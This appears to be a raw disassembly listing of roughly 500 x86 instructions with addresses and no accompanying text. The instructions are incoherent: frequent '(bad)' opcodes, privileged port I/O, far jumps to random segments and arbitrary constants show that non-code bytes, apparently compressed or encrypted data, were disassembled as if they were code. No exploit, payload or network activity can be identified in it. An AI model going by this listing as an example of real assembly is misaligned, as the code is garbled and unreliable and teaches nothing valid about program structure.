  42d79a:	fstp   QWORD PTR [edx]
  42d79c:	shl    ecx,1
  42d79e:	in     al,0x80
  42d7a0:	(bad)  
  42d7a2:	xor    eax,0xe96dc2cc
  42d7a7:	push   ecx
  42d7a8:	jle    0x42d79c
  42d7aa:	xor    al,0xe0
  42d7ac:	imul   ecx,DWORD PTR [edi],0x743db497
  42d7b2:	mov    eax,ds:0x5026cee9
  42d7b7:	(bad)  
  42d7b8:	xor    eax,0xada5d044
  42d7bd:	inc    ebp
  42d7be:	arpl   WORD PTR [ebx+0x508959a1],si
  42d7c4:	pop    ebx
  42d7c5:	mov    ebx,0xad56be55
  42d7ca:	add    BYTE PTR [edx*2+0x14b61746],al
  42d7d1:	mov    WORD PTR [edi+0x6c6db4b6],ds
  42d7d7:	cwde   
  42d7d8:	jb     0x42d807
  42d7da:	scas   eax,DWORD PTR es:[edi]
  42d7db:	xlat   BYTE PTR ds:[ebx]
  42d7dc:	mov    fs,WORD PTR [ecx-0x568bb269]
  42d7e2:	stos   DWORD PTR es:[edi],eax
  42d7e3:	loopne 0x42d864
  42d7e5:	outs   dx,BYTE PTR ds:[esi]
  42d7e6:	jmp    0x42d803
  42d7e8:	or     dh,ch
  42d7ea:	test   DWORD PTR [eax-0x4dfa8ad2],eax
  42d7f0:	out    dx,al
  42d7f1:	push   esi
  42d7f2:	(bad)  
  42d7f4:	fist   DWORD PTR [esi]
  42d7f6:	(bad)  [esi]
  42d7f8:	data16 in al,0xd7
  42d7fb:	inc    edi
  42d7fc:	std    
  42d7fd:	cmp    al,0x9
  42d7ff:	sub    al,0x93
  42d801:	mov    cs,WORD PTR [eax]
  42d803:	ss add al,al
  42d806:	dec    ecx
  42d807:	mov    dl,0xba
  42d809:	or     ebx,DWORD PTR [ebx+0x17]
  42d80c:	aam    0x1e
  42d80e:	cwde   
  42d80f:	pop    es
  42d810:	test   DWORD PTR [esi-0x57b3d4bf],esi
  42d816:	mov    ds:0x6b4d80a3,eax
  42d81b:	(bad)  
  42d81c:	mov    ds:0x54362c0,al
  42d821:	cmp    ecx,DWORD PTR [edx]
  42d823:	das    
  42d824:	push   es
  42d825:	bound  ecx,QWORD PTR [esi]
  42d827:	call   0xa090:0x89a8095
  42d82e:	jnp    0x42d7b3
  42d830:	data16 cmp BYTE PTR [edx-0x3d326d83],0xbd
  42d838:	lds    ebp,FWORD PTR [edx-0x70924928]
  42d83e:	aam    0xa4
  42d840:	ja     0x42d85a
  42d842:	pop    ecx
  42d843:	xor    ebx,DWORD PTR [ebx+0x43]
  42d846:	adc    al,0x9b
  42d848:	retf   0x91f8
  42d84b:	sbb    al,cl
  42d84d:	inc    esp
  42d84e:	sbb    edx,DWORD PTR [edi+0x1d6e95b8]
  42d854:	dec    ebx
  42d855:	lahf   
  42d856:	lods   eax,DWORD PTR ds:[esi]
  42d857:	outs   dx,BYTE PTR ds:[esi]
  42d858:	fwait
  42d859:	ds sbb al,0xa6
  42d85c:	add    BYTE PTR [edx+0x61],ah
  42d85f:	fist   DWORD PTR [esi+0x5735a706]
  42d865:	pop    ecx
  42d866:	dec    eax
  42d867:	add    DWORD PTR [edx],eax
  42d869:	ret    0x74b6
  42d86c:	(bad)  [ebp*1-0x4f07692f]
  42d873:	jmp    0xdadc:0x2d0dfbec
  42d87a:	lods   eax,DWORD PTR ds:[esi]
  42d87b:	mov    dl,0xa8
  42d87d:	loopne 0x42d8a5
  42d87f:	sbb    eax,0xe4a9ac46
  42d884:	mov    al,0x2d
  42d886:	je     0x42d898
  42d888:	out    dx,eax
  42d889:	pop    ecx
  42d88a:	mov    es,eax
  42d88c:	ds dec esi
  42d88e:	sti    
  42d88f:	shr    BYTE PTR [ebp-0x3d],1
  42d892:	sbb    DWORD PTR [esi],ebx
  42d894:	ret    0x96e0
  42d897:	jae    0x42d843
  42d899:	mov    ebp,DWORD PTR [edi+0x2f]
  42d89c:	sub    BYTE PTR [esi-0x4c],0x6d
  42d8a0:	fidivr WORD PTR [esi]
  42d8a2:	xor    DWORD PTR [edx+ecx*4-0x7d3d1b52],esp
  42d8a9:	mov    ds:0x41aa23ed,eax
  42d8ae:	das    
  42d8af:	lock lods al,BYTE PTR ds:[esi]
  42d8b1:	and    eax,0x468094f
  42d8b6:	in     eax,dx
  42d8b7:	jp     0x42d841
  42d8b9:	enter  0xf74c,0xab
  42d8bd:	and    esp,DWORD PTR [edx+0x6670085b]
  42d8c3:	loopne 0x42d8d1
  42d8c5:	jbe    0x42d877
  42d8c7:	aam    0x96
  42d8c9:	bound  esi,QWORD PTR [ebx]
  42d8cb:	sbb    DWORD PTR [ecx+ebp*8],eax
  42d8ce:	sbb    dh,dh
  42d8d0:	jmp    0xbef48f97
  42d8d5:	cmp    DWORD PTR [edx-0x32ca0a74],edi
  42d8db:	pop    edi
  42d8dc:	rcr    BYTE PTR [eax+ecx*4+0x2d],1
  42d8e0:	bound  edi,QWORD PTR [ecx+0x3d]
  42d8e3:	add    BYTE PTR [edx+0x6a],cl
  42d8e6:	push   edx
  42d8e7:	xor    al,0x16
  42d8e9:	or     dl,BYTE PTR [edi]
  42d8eb:	sbb    al,BYTE PTR [esi-0x6e]
  42d8ee:	rcr    al,1
  42d8f0:	popf   
  42d8f1:	popf   
  42d8f2:	or     eax,0x35b9620f
  42d8f7:	mov    bl,BYTE PTR [edx+0x21af9450]
  42d8fd:	inc    esi
  42d8fe:	push   ebx
  42d8ff:	aad    0x86
  42d901:	aad    0xb6
  42d903:	sub    al,dl
  42d905:	aas    
  42d906:	in     eax,dx
  42d907:	jmp    0x785d:0xd9c6e280
  42d90e:	push   ebx
  42d90f:	retf   
  42d910:	dec    eax
  42d911:	outs   dx,BYTE PTR ds:[esi]
  42d912:	test   DWORD PTR [edi],ebx
  42d914:	pop    ebp
  42d915:	enter  0x6da,0x4
  42d919:	cmc    
  42d91a:	(bad)  
  42d91b:	mov    esi,0x6d61a4e6
  42d920:	mov    ebx,DWORD PTR [edx-0x70782678]
  42d926:	hlt    
  42d927:	dec    ebp
  42d928:	mov    bh,BYTE PTR [edx]
  42d92a:	stos   BYTE PTR es:[edi],al
  42d92b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d92c:	sbb    al,0x62
  42d92e:	fwait
  42d92f:	xchg   edi,eax
  42d930:	jns    0x42d977
  42d932:	fist   DWORD PTR [ebx]
  42d934:	xor    eax,0xc54bb188
  42d939:	mov    edx,0x6d5fb42e
  42d93e:	mov    ebx,0xbd6e5657
  42d943:	dec    BYTE PTR [ecx+0xd]
  42d946:	xchg   ebp,eax
  42d947:	stos   DWORD PTR es:[edi],eax
  42d948:	jno    0x42d935
  42d94a:	stos   BYTE PTR es:[edi],al
  42d94b:	(bad)  
  42d94c:	icebp  
  42d94d:	xlat   BYTE PTR ds:[ebx]
  42d94e:	pop    ecx
  42d94f:	addr16 mov edx,0xc554dbd0
  42d955:	jbe    0x42d8e0
  42d957:	xor    eax,0xb83d1ebc
  42d95c:	aam    0x62
  42d95e:	(bad)  
  42d95f:	push   0xfcd246db
  42d964:	push   cs
  42d965:	and    DWORD PTR [edx],eax
  42d967:	jno    0x42d946
  42d969:	adc    DWORD PTR [edi-0x69a049ca],esi
  42d96f:	jnp    0x42d920
  42d971:	popf   
  42d972:	in     eax,0x25
  42d974:	mov    ch,0xb5
  42d976:	pop    ebx
  42d977:	inc    edi
  42d978:	stos   DWORD PTR es:[edi],eax
  42d979:	(bad)  
  42d97b:	cs into 
  42d97d:	adc    ebx,edi
  42d97f:	dec    esi
  42d980:	sbb    bl,0xb6
  42d983:	mov    cl,0x43
  42d985:	imul   edx,DWORD PTR [esi-0x1f6de2a8],0x8580f8f7
  42d98f:	mov    dh,0x1
  42d991:	and    BYTE PTR [esp+eax*2],cl
  42d994:	xor    al,cl
  42d996:	je     0x42d91a
  42d998:	(bad)  [esi-0x7d445d2b]
  42d99e:	xor    dl,0x6e
  42d9a1:	mov    ds:0xadc00d23,al
  42d9a6:	or     ebx,DWORD PTR [esi+0x291762a1]
  42d9ac:	or     DWORD PTR [edx+eiz*1],ebx
  42d9af:	mov    eax,0x172fb46d
  42d9b4:	jnp    0x42da28
  42d9b6:	in     al,dx
  42d9b7:	xor    eax,0xa81400fc
  42d9bc:	call   0xbb3ce5bf
  42d9c1:	mov    cl,0x60
  42d9c3:	stos   BYTE PTR es:[edi],al
  42d9c4:	and    DWORD PTR [ecx-0x7fb7319c],eax
  42d9ca:	jge    0x42da1d
  42d9cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d9cd:	lods   eax,DWORD PTR ds:[esi]
  42d9ce:	and    DWORD PTR [ecx],ebx
  42d9d0:	mov    ecx,0xd7864dd4
  42d9d5:	or     eax,0xa1d80b4a
  42d9da:	mov    bl,0xe0
  42d9dc:	cdq    
  42d9dd:	shl    bh,1
  42d9df:	jp     0x42d992
  42d9e1:	mov    ds:0x45e584ea,eax
  42d9e6:	div    BYTE PTR [ecx-0x5248bbf1]
  42d9ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d9ed:	dec    BYTE PTR [esi+eiz*4-0x7cda5e7d]
  42d9f4:	mov    dh,0xed
  42d9f6:	push   edx
  42d9f7:	pop    es
  42d9f8:	jmp    0x5a70:0xdb75f840
  42d9ff:	push   0x46ed55e1
  42da04:	fistp  DWORD PTR [edi+0x14]
  42da07:	or     BYTE PTR [edi-0x4c],ch
  42da0a:	mov    bh,0x86
  42da0c:	push   ebp
  42da0d:	add    eax,0x36a6b6a2
  42da12:	xor    dl,dl
  42da14:	push   ss
  42da15:	retf   0x2b6d
  42da18:	stos   DWORD PTR es:[edi],eax
  42da19:	push   ebx
  42da1a:	pop    ebx
  42da1b:	xchg   edx,eax
  42da1c:	push   cs
  42da1d:	mov    esi,0x5b68127f
  42da22:	fsub   DWORD PTR [eax+0x30d332b0]
  42da28:	cmp    edi,esp
  42da2a:	add    esp,ebx
  42da2c:	fdivr  DWORD PTR [edx+0x59f5d989]
  42da32:	xchg   esi,eax
  42da33:	inc    esi
  42da34:	fs mov edx,0x625d0b6d
  42da3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da3b:	dec    ecx
  42da3c:	stos   DWORD PTR es:[edi],eax
  42da3d:	sti    
  42da3e:	into   
  42da3f:	push   cs
  42da40:	mov    DWORD PTR [esi+0x5a],edi
  42da43:	popa   
  42da44:	fistp  DWORD PTR [esi+0x298c0424]
  42da4a:	xor    dl,BYTE PTR [ebx+0x55]
  42da4d:	inc    esi
  42da4e:	push   ss
  42da4f:	mov    edx,0xbf8a36d0
  42da54:	sbb    eax,0x2e46761
  42da59:	xchg   edx,eax
  42da5a:	lods   eax,DWORD PTR ds:[esi]
  42da5b:	mov    ds:0xea85b6a,eax
  42da60:	leave  
  42da61:	jnp    0x42da7b
  42da63:	inc    esp
  42da64:	adc    eax,0xaad55db5
  42da69:	xchg   edi,eax
  42da6a:	pop    edi
  42da6b:	ja     0x42dae4
  42da6d:	enter  0x7454,0x44
  42da71:	ins    BYTE PTR es:[edi],dx
  42da72:	es in  al,0x40
  42da75:	cwde   
  42da76:	pop    ebx
  42da77:	pop    ebx
  42da78:	mov    eax,0x4fb549f0
  42da7d:	push   eax
  42da7e:	fidiv  DWORD PTR [edx+0x185f4de7]
  42da84:	lea    eax,[ebp-0x2a3d7f52]
  42da8a:	push   cs
  42da8b:	icebp  
  42da8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da8d:	ss imul ebx,ebx,0xffffffc2
  42da91:	test   esi,ebp
  42da93:	hlt    
  42da94:	int3   
  42da95:	retf   
  42da96:	loop   0x42dacc
  42da98:	cmc    
  42da99:	mov    dh,0xc2
  42da9b:	push   eax
  42da9c:	mov    bh,bl
  42da9e:	jbe    0x42db0b
  42daa0:	rol    DWORD PTR [ecx],0xf9
  42daa3:	scas   eax,DWORD PTR es:[edi]
  42daa4:	sbb    ch,0xb3
  42daa7:	push   0xffffffde
  42daa9:	mov    DWORD PTR [esi-0x185f653],esi
  42daaf:	enter  0x3e74,0x84
  42dab3:	jnp    0x42da90
  42dab5:	jmp    0x8b37:0x3086088
  42dabc:	mov    eax,ds:0x85b61638
  42dac1:	jbe    0x42da53
  42dac3:	into   
  42dac4:	stos   BYTE PTR es:[edi],al
  42dac5:	(bad)  
  42dac6:	cdq    
  42dac7:	sbb    DWORD PTR [ecx-0x225c5c48],0xffffff96
  42dace:	push   ss
  42dacf:	mov    BYTE PTR [edi-0x33d0e83e],dh
  42dad5:	mov    edx,0x13600f32
  42dada:	shr    BYTE PTR [ebp+0x35],0x8f
  42dade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dadf:	xor    edx,DWORD PTR [eax-0x57]
  42dae2:	call   0x9e64074
  42dae7:	and    esp,DWORD PTR [edx]
  42dae9:	pop    ebp
  42daea:	cmp    DWORD PTR [edi+0x75],edi
  42daed:	(bad)  
  42daee:	push   esp
  42daef:	lds    ebp,FWORD PTR [ebp-0x2e860228]
  42daf5:	hlt    
  42daf6:	pop    eax
  42daf7:	xor    eax,0xd2d2c6c2
  42dafc:	mov    edx,0xc4c52d29
  42db01:	mov    cl,0xe2
  42db03:	pop    es
  42db04:	outs   dx,BYTE PTR ds:[esi]
  42db05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db06:	ret    0xdbc5
  42db09:	test   al,0x3d
  42db0b:	fnsave [edx]
  42db0d:	cli    
  42db0e:	mov    al,0x15
  42db10:	mov    cl,0xd1
  42db12:	push   esi
  42db13:	sub    eax,0xc20d327d
  42db18:	rcl    dh,cl
  42db1a:	inc    ecx
  42db1b:	ins    DWORD PTR es:[edi],dx
  42db1c:	xchg   edx,eax
  42db1d:	mov    dh,0x2c
  42db1f:	dec    ebp
  42db20:	call   0x6f1b7de6
  42db25:	fistp  DWORD PTR [esi+0x23]
  42db28:	js     0x42dba7
  42db2a:	int    0x28
  42db2c:	pop    edi
  42db2d:	jg     0x42db85
  42db2f:	inc    ecx
  42db30:	sub    ebx,DWORD PTR [edx+0x468acd00]
  42db36:	push   ebp
  42db37:	fmul   QWORD PTR [edx]
  42db39:	fcmovnb st,st(7)
  42db3b:	pop    esp
  42db3c:	enter  0x9b4f,0xfe
  42db40:	jae    0x42db56
  42db42:	sub    eax,0x809cdadf
  42db47:	loop   0x42daf8
  42db49:	xor    DWORD PTR [eax],eax
  42db4b:	mov    ebp,0xaa3aa466
  42db50:	mov    eax,0xd8ed29d1
  42db55:	sub    ebp,DWORD PTR [edi]
  42db57:	gs mov ecx,0xd8d85b69
  42db5d:	sahf   
  42db5e:	jg     0x42db32
  42db60:	jmp    0x8b50:0x6708e3af
  42db67:	sbb    eax,0xbe066175
  42db6c:	jmp    FWORD PTR [edx]
  42db6e:	lahf   
  42db6f:	dec    ebp
  42db70:	xlat   BYTE PTR ds:[ebx]
  42db71:	inc    ebp
  42db72:	jmp    0x42db14
  42db74:	ss call 0x74d81970
  42db7a:	rcl    DWORD PTR [esi+0x46],1
  42db7d:	adc    esi,DWORD PTR [ecx+0x7f3b4d70]
  42db83:	xchg   ebp,eax
  42db84:	out    dx,eax
  42db85:	push   ss
  42db86:	in     al,0x50
  42db88:	ins    BYTE PTR es:[edi],dx
  42db89:	mov    ds:0xeffeceed,al
  42db8e:	arpl   bx,si
  42db90:	pop    esi
  42db91:	sbb    BYTE PTR [ecx-0x3c8b92fa],cl
  42db97:	je     0x42db32
  42db99:	sbb    dl,BYTE PTR [ecx-0x3924fb96]
  42db9f:	ins    DWORD PTR es:[edi],dx
  42dba0:	pop    edx
  42dba1:	add    al,bh
  42dba3:	lock shl BYTE PTR [esi],0xaa
  42dba7:	int3   
  42dba8:	fdivr  QWORD PTR [edx+0x4d440d88]
  42dbae:	stos   BYTE PTR es:[edi],al
  42dbaf:	or     al,BYTE PTR [ecx+ebx*2-0x2b]
  42dbb3:	in     al,dx
  42dbb4:	ins    DWORD PTR es:[edi],dx
  42dbb5:	mov    ah,0xd
  42dbb7:	adc    eax,0xe057049e
  42dbbc:	js     0x42dbfa
  42dbbe:	push   es
  42dbbf:	and    BYTE PTR [esi],ch
  42dbc1:	mov    cl,0x2
  42dbc3:	pushf  
  42dbc4:	(bad)  
  42dbc5:	push   ebp
  42dbc6:	jnp    0x42db7a
  42dbc8:	mov    BYTE PTR [ebx+0x17],bl
  42dbcb:	rcr    BYTE PTR [edx+0x509e7afc],1
  42dbd1:	(bad)  
  42dbd3:	ficom  DWORD PTR [esi-0x7f5944f6]
  42dbd9:	call   esi
  42dbdb:	and    al,bh
  42dbdd:	fiadd  DWORD PTR [edi-0x4a]
  42dbe0:	test   DWORD PTR [esi+0x3af982dd],esi
  42dbe6:	ret    0xddcd
  42dbe9:	or     eax,0xd60dc88e
  42dbee:	inc    eax
  42dbef:	ins    BYTE PTR es:[edi],dx
  42dbf0:	fcomp  QWORD PTR [ebp+ebp*8+0x68]
  42dbf4:	cdq    
  42dbf5:	xlat   BYTE PTR ds:[ebx]
  42dbf6:	pop    ebx
  42dbf7:	scas   eax,DWORD PTR es:[edi]
  42dbf8:	aam    0x1b
  42dbfa:	jmp    0xe2fa:0x5e78c2c2
  42dc01:	aas    
  42dc02:	sub    DWORD PTR [ebx-0x3b],eax
  42dc05:	nop
  42dc06:	pop    ebx
  42dc07:	sbb    ecx,DWORD PTR ds:0x1ef66b11
  42dc0d:	gs pop es
  42dc0f:	mov    cl,0xdd
  42dc11:	sbb    ch,BYTE PTR [eax]
  42dc13:	mov    dh,0x12
  42dc15:	das    
  42dc16:	cwde   
  42dc17:	std    
  42dc18:	adc    BYTE PTR [edx-0x4],ah
  42dc1b:	xor    edi,DWORD PTR [ebx-0x764faf2f]
  42dc21:	into   
  42dc22:	and    eax,0x2d3a3c0c
  42dc27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc28:	or     esi,DWORD PTR [edi-0x707e97fa]
  42dc2e:	mov    ch,0x9b
  42dc30:	jno    0x42dc3e
  42dc32:	mov    al,ds:0xad8dc52e
  42dc37:	ins    DWORD PTR es:[edi],dx
  42dc38:	lds    ecx,FWORD PTR [esi+0x3688aa89]
  42dc3e:	sub    DWORD PTR [esi-0x13],ebp
  42dc41:	(bad)  
  42dc42:	inc    esi
  42dc43:	push   edi
  42dc44:	add    ecx,DWORD PTR [esi-0x67]
  42dc47:	loope  0x42dbcb
  42dc49:	jmp    0x42dc9c
  42dc4b:	fwait
  42dc4c:	push   ss
  42dc4d:	cmp    ch,BYTE PTR [eax-0x210bd4a]
  42dc53:	in     eax,0x67
  42dc55:	les    ebx,FWORD PTR [ebx]
  42dc57:	and    DWORD PTR [eax-0x57],ebp
  42dc5a:	fucom  st(3)
  42dc5c:	ins    BYTE PTR es:[edi],dx
  42dc5d:	jae    0x42dcc1
  42dc5f:	mov    ecx,0x61129768
  42dc64:	mov    BYTE PTR [ebx+0xb],bl
  42dc67:	inc    ebp
  42dc68:	cwde   
  42dc69:	dec    esi
  42dc6a:	push   ebx
  42dc6b:	or     ecx,DWORD PTR [ebx+0x0]
  42dc6e:	fstp   TBYTE PTR [eax]
  42dc70:	push   cs
  42dc71:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42dc73:	jo     0x42dc82
  42dc75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc76:	adc    eax,0x7440352e
  42dc7b:	mov    ebx,0x3d455c05
  42dc80:	and    eax,0xc2b116da
  42dc85:	les    ecx,FWORD PTR [eax-0x54534923]
  42dc8b:	ins    DWORD PTR es:[edi],dx
  42dc8c:	(bad)  
  42dc8e:	jnp    0x42dc8a
  42dc90:	pop    ecx
  42dc91:	sahf   
  42dc92:	std    
  42dc93:	mov    ah,BYTE PTR [edi+esi*1]
  42dc96:	mov    ecx,0xb0a37170
  42dc9b:	jo     0x42dcff
  42dc9d:	sbb    eax,0x75d6f7f4
  42dca2:	xor    al,0x23
  42dca4:	lods   eax,DWORD PTR ds:[esi]
  42dca5:	imul   eax,DWORD PTR [bx],0x8c24139f
  42dcac:	clc    
  42dcad:	inc    edx
  42dcae:	push   0xffffffb5
  42dcb0:	mov    al,ds:0x7a3db76d
  42dcb5:	add    DWORD PTR [ebp+0x2f],ebp
  42dcb8:	mov    esi,0xdb5be5b9
  42dcbd:	mov    dh,0xb5
  42dcbf:	adc    DWORD PTR [edi+ebx*1+0x49],ecx
  42dcc3:	mov    ecx,0x31bb5c58
  42dcc8:	xchg   edx,eax
  42dcc9:	lods   eax,DWORD PTR ds:[esi]
  42dcca:	mov    cl,0x23
  42dccc:	sbb    BYTE PTR [ebx],0x12
  42dccf:	(bad)  
  42dcd0:	adc    eax,DWORD PTR [ebp+eax*1-0x7a77d49e]
  42dcd7:	repnz or bl,BYTE PTR [esi+0x2c004e4b]
  42dcde:	ins    BYTE PTR es:[edi],dx
  42dcdf:	sbb    BYTE PTR [ebx-0x50],0x5e
  42dce3:	lods   al,BYTE PTR ds:[esi]
  42dce4:	push   ss
  42dce5:	ins    DWORD PTR es:[edi],dx
  42dce6:	test   DWORD PTR [ebp-0x25],ebp
  42dce9:	mov    ebp,0x9af854ca
  42dcee:	add    eax,0x69e99d4c
  42dcf3:	add    ch,ch
  42dcf5:	or     BYTE PTR [eax-0x46827cad],bh
  42dcfb:	lock pop ecx
  42dcfd:	xor    eax,0x2f3b7010
  42dd02:	data16 fstp DWORD PTR gs:[ebp-0x25a4a4d3]
  42dd0a:	xor    DWORD PTR cs:[edx],0xffffffd3
  42dd0e:	inc    esp
  42dd0f:	mov    ecx,0x5800f65
  42dd14:	fadd   DWORD PTR [edx+0x4822ead]
  42dd1a:	ret    0x164
  42dd1d:	ja     0x42dd34
  42dd1f:	mov    cl,0x0
  42dd21:	or     eax,0xdc4ba6fd
  42dd26:	sbb    al,BYTE PTR [eax-0x3cc44f28]
  42dd2c:	mov    ds,esp
  42dd2e:	sub    esi,esi
  42dd30:	in     eax,dx
  42dd31:	frstor [eax-0x5e35d3d4]
  42dd37:	pop    ds
  42dd38:	xchg   BYTE PTR [esi-0x17fe1a73],bl
  42dd3e:	push   0x97fa14a1
  42dd43:	addr16 clc 
  42dd45:	push   ds
  42dd46:	(bad)  
  42dd47:	push   esp
  42dd48:	fld    TBYTE PTR [ebp+0x2a952c41]
  42dd4e:	fcmove st,st(6)
  42dd50:	and    BYTE PTR [edx+0x6e945008],cl
  42dd56:	fist   DWORD PTR [edi+ebx*2-0x4c]
  42dd5a:	pop    DWORD PTR [ebx]
  42dd5c:	mov    ds:0xb5b6c571,al
  42dd61:	mov    ds:0xede936e7,al
  42dd66:	lods   eax,DWORD PTR ds:[esi]
  42dd67:	push   esp
  42dd68:	fimul  DWORD PTR [ebp+0x741241ad]
  42dd6e:	mov    ds:0xf8294e84,eax
  42dd73:	push   0xb3dd783b
  42dd78:	pop    ebx
  42dd79:	push   ebp
  42dd7a:	test   edi,ebp
  42dd7c:	sbb    al,0xae
  42dd7e:	out    dx,eax
  42dd7f:	pop    edx
  42dd80:	add    BYTE PTR [esi],dl
  42dd82:	push   ss
  42dd83:	jle    0x42dd18
  42dd85:	icebp  
  42dd86:	xchg   BYTE PTR [ebx],bl
  42dd88:	int3   
  42dd89:	push   0xdb9edb6b
  42dd8e:	out    dx,al
  42dd8f:	sbb    eax,0x97f36523
  42dd94:	push   ebp
  42dd95:	lods   eax,DWORD PTR ds:[esi]
  42dd96:	push   ebp
  42dd97:	ins    BYTE PTR es:[edi],dx
  42dd98:	and    eax,0x9997b684
  42dd9d:	pop    ecx
  42dd9e:	ins    DWORD PTR es:[edi],dx
  42dd9f:	or     ecx,DWORD PTR ds:0x8a911bc5
  42dda5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dda6:	dec    ecx
  42dda7:	mov    edx,0xadb7a4a7
  42ddac:	push   eax
  42ddad:	mov    ah,0xc8
  42ddaf:	cmp    eax,0x770a2c0e
  42ddb4:	push   esi
  42ddb5:	xor    eax,0x517616f
  42ddba:	cmp    DWORD PTR [ebx],ebx
  42ddbc:	dec    ebp
  42ddbd:	or     eax,0x55418f1e
  42ddc2:	add    dl,bl
  42ddc4:	stos   BYTE PTR es:[edi],al
  42ddc5:	push   es
  42ddc6:	sbb    cl,bh
  42ddc8:	mov    ebx,0x460cd82a
  42ddcd:	mov    edi,0x78104a3b
  42ddd2:	ss push ss
  42ddd4:	push   ss
  42ddd5:	sbb    bl,BYTE PTR [ebp+ebx*4+0x3feb70ca]
  42dddc:	mov    ds:0x80582a68,al
  42dde1:	lds    esi,FWORD PTR [ebp+0x5ad1c8d7]
  42dde7:	popa   
  42dde8:	fstp   TBYTE PTR [ecx]
  42ddea:	fld    QWORD PTR [esi+0x2675e255]
  42ddf0:	add    DWORD PTR [esi],ebp
  42ddf2:	ins    BYTE PTR es:[edi],dx
  42ddf3:	mov    ah,0x21
  42ddf5:	cmp    ebx,ebp
  42ddf7:	pop    edi
  42ddf8:	mov    eax,0x5282e5cc
  42ddfd:	fild   DWORD PTR [eax]
  42ddff:	mov    cl,0xd6
  42de01:	pop    ss
  42de02:	push   ecx
  42de03:	ins    DWORD PTR es:[edi],dx
  42de04:	cs pop ss
  42de06:	inc    esp
  42de07:	mov    eax,0xe7db6db0
  42de0c:	je     0x42de4a
  42de0e:	ret    0xa859
  42de11:	out    0x37,al
  42de13:	sbb    bh,bl
  42de15:	adc    al,0xdc
  42de17:	retf   0xe417
  42de1a:	xor    al,BYTE PTR [eax]
  42de1c:	lahf   
  42de1d:	lahf   
  42de1e:	lods   eax,DWORD PTR ds:[esi]
  42de1f:	loop   0x42ddb3
  42de21:	test   BYTE PTR [ecx+0x1270360d],0x56
  42de28:	inc    ecx
  42de29:	push   edi
  42de2a:	nop
  42de2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42de2c:	adc    al,0xb9
  42de2e:	cs xchg esp,eax
  42de30:	sbb    dl,0xa6
  42de33:	in     al,dx
  42de34:	or     BYTE PTR [ecx+0x52],bh
  42de37:	xor    DWORD PTR [eax-0x5a77124e],eax
  42de3d:	dec    ebp
  42de3e:	sub    eax,0xba8a840b
  42de43:	or     BYTE PTR [ebp+0x78d17029],0x71
  42de4a:	imul   eax,DWORD PTR [esp+edx*4-0x67],0xfffffff4
  42de4f:	es mov edi,0x76281b60
  42de55:	push   eax
  42de56:	sbb    BYTE PTR [esi],dl
  42de58:	(bad)  
  42de59:	pop    ebx
  42de5a:	lods   al,BYTE PTR ds:[esi]
  42de5b:	mov    eax,0x68dd4476
  42de60:	mov    WORD PTR [ebx-0x59],?
  42de63:	in     eax,dx
  42de64:	jecxz  0x42deda
  42de66:	or     edi,DWORD PTR [ebx]
  42de68:	stos   BYTE PTR es:[edi],al
  42de69:	mov    eax,0xe9807315
  42de6e:	xchg   BYTE PTR [eax+0x3d],dl
  42de71:	cmp    ah,al
  42de73:	inc    edx
  42de74:	add    eax,DWORD PTR [ecx]
  42de76:	push   0xffffff9b
  42de78:	add    al,0xaf
  42de7a:	mov    cl,0xdb
  42de7c:	push   ecx
  42de7d:	ror    BYTE PTR [esi+0x297c2ce8],0xb3
  42de84:	cmp    BYTE PTR [ecx+0x52e208ed],ch
  42de8a:	pop    ecx
  42de8b:	arpl   WORD PTR [ecx+0x77],bp
  42de8e:	stos   DWORD PTR es:[edi],eax
  42de8f:	rcr    DWORD PTR [edx+0x4314762a],1
  42de95:	jb     0x42deaf
  42de97:	adc    BYTE PTR [ebx+ebp*4],ch
  42de9a:	mov    al,BYTE PTR [ebp-0x3280762a]
  42dea0:	jl     0x42df17
  42dea2:	inc    esi
  42dea3:	mov    DWORD PTR [esi+0x845b9b6],esi
  42dea9:	ficomp DWORD PTR [edx+0x11dbbd8d]
  42deaf:	mov    al,0xfc
  42deb1:	push   esp
  42deb2:	add    BYTE PTR es:0xee38f21a,ch
  42deb9:	repz out dx,eax
  42debb:	fcmovnu st,st(2)
  42debd:	push   0xd8c3ae54
  42dec2:	mov    ebx,0x6da2bcf1
  42dec7:	imul   esp,DWORD PTR [ecx-0x55],0x56296e97
  42dece:	sub    DWORD PTR [ecx-0x6a44bd2a],edi
  42ded4:	out    0x1d,al
  42ded6:	adc    DWORD PTR [edi],esi
  42ded8:	sub    DWORD PTR [eax],0xffffff8e
  42dedb:	std    
  42dedc:	shl    BYTE PTR [ebp+0x3080ea2e],0x93
  42dee3:	sar    BYTE PTR [ebx],cl
  42dee5:	pusha  
  42dee6:	cs push esi
  42dee8:	push   esp
  42dee9:	mov    ebx,0x11476975
  42deee:	(bad)  
  42def0:	enter  0x1da2,0x5
  42def4:	(bad)  
  42def6:	jg     0x42de8a
  42def8:	das    
  42def9:	outs   dx,DWORD PTR ss:[esi]
  42defb:	(bad)  
  42defc:	das    
  42defd:	dec    esi
  42defe:	mov    cl,0x5
  42df00:	mov    ch,0x11
  42df02:	ds mov bl,0x4c
  42df05:	neg    ebx
  42df07:	lods   eax,DWORD PTR ds:[esi]
  42df08:	ins    DWORD PTR es:[edi],dx
  42df09:	fadd   QWORD PTR [edx]
  42df0b:	in     eax,dx
  42df0c:	cmp    DWORD PTR [ecx+0x27],ebp
  42df0f:	mov    esp,0x1434fcd7
  42df14:	cmc    
  42df15:	imul   edi,DWORD PTR [ebx+0x786700d4],0xffffffec
  42df1c:	ins    BYTE PTR es:[edi],dx
  42df1d:	jb     0x42df24
  42df1f:	push   es
  42df20:	pop    esi
  42df21:	imul   ebx,ebx,0x6d
  42df24:	jecxz  0x42df9c
  42df26:	pop    edx
  42df27:	jge    0x42df79
  42df29:	inc    ecx
  42df2a:	push   ss
  42df2b:	cmp    edi,eax
  42df2d:	jge    0x42df1e
  42df2f:	sub    BYTE PTR [esi],dh
